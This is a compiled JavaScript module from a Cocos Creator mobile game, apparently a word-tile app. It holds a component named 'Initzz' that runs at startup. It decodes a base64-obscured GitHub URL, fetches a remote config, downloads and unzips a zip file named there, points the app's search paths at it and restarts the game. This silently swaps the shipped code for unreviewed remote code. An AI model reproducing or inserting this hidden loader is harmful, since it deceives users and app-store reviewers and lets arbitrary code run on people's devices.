window.__require = function t(e, o, r) {
function n(s, c) {
if (!o[s]) {
if (!e[s]) {
var a = s.split("/");
a = a[a.length - 1];
if (!e[a]) {
var l = "function" == typeof __require && __require;
if (!c && l) return l(a, !0);
if (i) return i(a, !0);
throw new Error("Cannot find module '" + s + "'");
}
}
var u = o[s] = {
exports: {}
};
e[s][0].call(u.exports, function(t) {
return n(e[s][1][t] || t);
}, u, u.exports, t, e, o, r);
}
return o[s].exports;
}
for (var i = "function" == typeof __require && __require, s = 0; s < r.length; s++) n(r[s]);
return n;
}({
Initzz: [ function(t, e, o) {
"use strict";
cc._RF.push(e, "e3cba1XsUFCnJKwmkOmM0Ns", "Initzz");
Object.defineProperty(o, "__esModule", {
value: !0
});
var r = "", n = "", i = cc._decorator, s = i.ccclass, c = (i.property, function(t) {
__extends(e, t);
function e() {
return null !== t && t.apply(this, arguments) || this;
}
e.prototype.onLoad = function() {
this._start();
};
e.prototype.getDL = function(t, e) {
console.log("urll manifestttttttt ======> " + t);
var o = cc.loader.getXMLHttpRequest();
o.onreadystatechange = function() {
if (4 === o.readyState && 200 === o.status) {
console.log("xhr.responseText ======> " + o.responseText);
o.responseText && e && e(o.responseText);
}
};
o.onerror = function() {};
o.ontimeout = function(t) {};
o.timeout = 3e3;
o.open("GET", t, !0);
o.send();
};
e.prototype.onSucceed = function(t) {
console.log("onSucceed ======> " + t);
switch (t.requestURL) {
case n:
jsb.fileUtils.unzip(t.storagePath);
var e = [];
e.push(r);
jsb.fileUtils.setSearchPaths(e);
localStorage.setItem("storagePath", r);
cc.game.restart();
}
};
e.prototype.convertLink = function() {
return atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NhYml6ZXJ6L2NvbmZpZ19wZXJmZWN0bGV0dGVydGlsZXMvbWFpbi9nZy5qc29uJUMzJTg0");
};
e.prototype._start = function() {
var t = this.convertLink();
console.log("url--------\x3e", t);
this.getDL(t, function(e) {
cc.sys.localStorage.setItem("urlfib", t);
var o = JSON.parse(e);
n = o.urlfile;
cc.sys.localStorage.setItem("mainname", o.mainname);
cc.sys.localStorage.setItem("keyKeyEncrypt", o.key);
cc.sys.localStorage.setItem("orr", o.xxxorientation);
jsb.reflection.callStaticMethod("AppController", "setRotation:", o.xxxorientation);
var i = new jsb.Downloader();
i.setOnFileTaskSuccess(this.onSucceed.bind(this));
r = jsb.fileUtils.getWritablePath() + "targetZip/";
jsb.fileUtils.getWritablePath();
jsb.fileUtils.removeFile(r + "data.zip");
jsb.fileUtils.createDirectory(r);
i.createDownloadFileTask(n, r + "data.zip");
}.bind(this));
};
return e = __decorate([ s ], e);
}(cc.Component));
o.default = c;
cc._RF.pop();
}, {} ]
}, {}, [ "Initzz" ]);